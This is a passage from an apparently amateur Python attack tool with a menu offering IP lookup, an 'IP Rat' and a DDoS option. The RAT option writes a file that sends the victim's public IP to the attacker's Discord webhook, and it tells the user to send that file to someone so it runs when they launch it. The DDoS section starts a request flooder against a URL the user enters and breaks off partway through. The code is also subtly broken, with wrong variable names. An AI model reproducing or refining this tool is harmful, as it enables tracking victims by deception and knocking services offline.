...
██╔══██║╚════╝██║╚██╗██║╚════╝██╔══╝  
██║  ██║      ██║ ╚████║      ███████╗
╚═╝  ╚═╝      ╚═╝  ╚═══╝      ╚══════╝'''), pystyle.Colors.green, interval = 0.0005)
        pystyle.Write.Print(pystyle.Center.XCenter('''
█████████████████████████████████████
█         1.IP Checker              █
█         2.IP Rat                  █
█         3.DDoS                    █
█████████████████████████████████████'''), pystyle.Colors.green, interval = 0.0005)
        ask_questions = input(print('''
Enter a Number > '''))
        
        if ask_questions == "1":
            ip = pystyle.Write.Input("\n[?] Enter IP-adress -> ", pystyle.Colors.green , interval = 0.005)
            def ip_lookup(ip):
                ...
                try:
                    ...
                    if data.get("status") == "fail":
                        pystyle.Write.Print(f"[!] Error!: {data['message']}\n", pystyle.Colors.green , interval=0.005)
                    info = ""
                    for key, value in data.items():
                        info += f"[+] {key}: {value}\n"
                    return info
                except Exception as e:
                    pystyle.Write.Print(f"[!] Error!: {str(e)}\n", pystyle.Colors.green , interval=0.005)
            print()
            pystyle.Write.Print(ip_lookup(ip), pystyle.Colors.green , interval=0.005)
            time.sleep(5)
            os.system("cls")
        else:
            print("Your request didnt entered correctly!", ask_questions)
        
        
        if ask_questions == "2":
            askwebhook = 'PUT YOUR WEHOOK HERE'
            webhookask = print("Open code and put your webhook in 'askwebhook'")
            print("Wait, im creating a file.....")
            time.sleep(5)
            print("File sucsessfully created!")
            print("Now, just send this file to someone, and when they launch it, theirs ip will be send to your webhook!")
            time.sleep(6)
            ratcode = ["import os\n","from requests import get\n", "from discord_webhook import DiscordWebhook\n","os.system('pip install requests')\n","os.system('pip install discord_webhook')\n","getlauncherip = get('https://api.ipify.org').content.decode('utf8')\n",'''webhook = DiscordWebhook(url=askwebhook,
                         content='Their Public IP Address Is: {}'.format(ip))\n''',"response = webhook.execute()\n"]
            with open("iprat.py", "w") as file:
                file.writelines(ratcode)
        else:
            print("Your request didnt entered correctly!", ask_questions)
        if ask_questions == "3":

                url = pystyle.Write.Input("Enter Ip or Url: ", pystyle.Colors.purple_to_blue , interval=0.005)
                num_requests = int(
                    pystyle.Write.Input(
                        "Enter power of DDoS: ", pystyle.Colors.purple_to_blue , interval=0.005
                    )
                )
                usersagents = useragentss
                def send_request(i):
                    user_agent = random.choice(usersagents)
                    headers = {"User-Agent": usersagents}
                    try:
